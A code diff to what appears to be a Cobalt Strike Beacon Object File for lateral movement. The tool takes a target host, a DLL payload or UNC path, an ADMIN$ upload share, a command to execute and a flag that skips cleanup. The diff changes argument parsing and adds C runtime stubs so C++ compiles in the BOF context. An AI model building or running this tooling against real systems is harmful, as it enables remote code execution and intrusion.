@@ -11,9 +11,8 @@
  *   short  mode           0=jump, 1=exec
  *   char*  target         hostname or IP
  *   char*  command        command to run (exec mode only, empty for jump)
- *   int    dll_len        length of DLL data (0 = use dll_path as UNC)
- *   char*  dll_data       raw DLL bytes (if dll_len > 0)
- *   char*  dll_path       UNC override path (if dll_len == 0, use this path directly)
+ *   char*  dll_data       raw DLL bytes (length from BeaconDataExtract)
+ *   char*  dll_path       UNC override path (if dll_data empty, use this path directly)
  *   char*  share          share name for upload (default ADMIN$)
  *   char*  guid           FinalPolicy GUID alias: "default", "driver", "https"
  *   short  no_cleanup     1 = skip registry restore + file delete
@@ -21,7 +20,6 @@
 
 #include <windows.h>
 #include <wbemcli.h>
-#include <comdef.h>
 #include <stdio.h>
 
 extern "C" {
@@ -63,8 +61,25 @@ DECLSPEC_IMPORT VOID     WINAPI OLEAUT32$SysFreeString(BSTR);
 WINBASEAPI int __cdecl MSVCRT$_snprintf(char*, size_t, const char*, ...);
 WINBASEAPI size_t __cdecl MSVCRT$strlen(const char*);
 WINBASEAPI int __cdecl MSVCRT$_stricmp(const char*, const char*);
+WINBASEAPI void* __cdecl MSVCRT$memset(void*, int, size_t);
+WINBASEAPI void* __cdecl MSVCRT$memcpy(void*, const void*, size_t);
+DECLSPEC_IMPORT HLOCAL   WINAPI KERNEL32$LocalFree(HLOCAL);
 
 } /* extern "C" */
+
+/* ---- C runtime stubs required by C++ in BOF context ---- */
+/* ponytail: C++ zero-init, stack probes, and delete aren't available in BOFs.
+ * Provide minimal stubs. If the BOF grows past 4KB stack frames, __chkstk_ms
+ * needs a real implementation. */
+extern "C" {
+void *memset(void *s, int c, size_t n) { return MSVCRT$memset(s, c, n); }
+void *memcpy(void *d, const void *s, size_t n) { return MSVCRT$memcpy(d, s, n); }
+#ifdef __x86_64__
+void ___chkstk_ms(void) { }
+#endif
+}
+void operator delete(void *p) noexcept { if (p) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, p); }
+void operator delete(void *p, unsigned long long) noexcept { if (p) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, p); }
 
 /* ---- Macros ---- */
 #define TMB_OK(fmt, ...)    BeaconPrintf(CALLBACK_OUTPUT, "[+] " fmt, ##__VA_ARGS__)
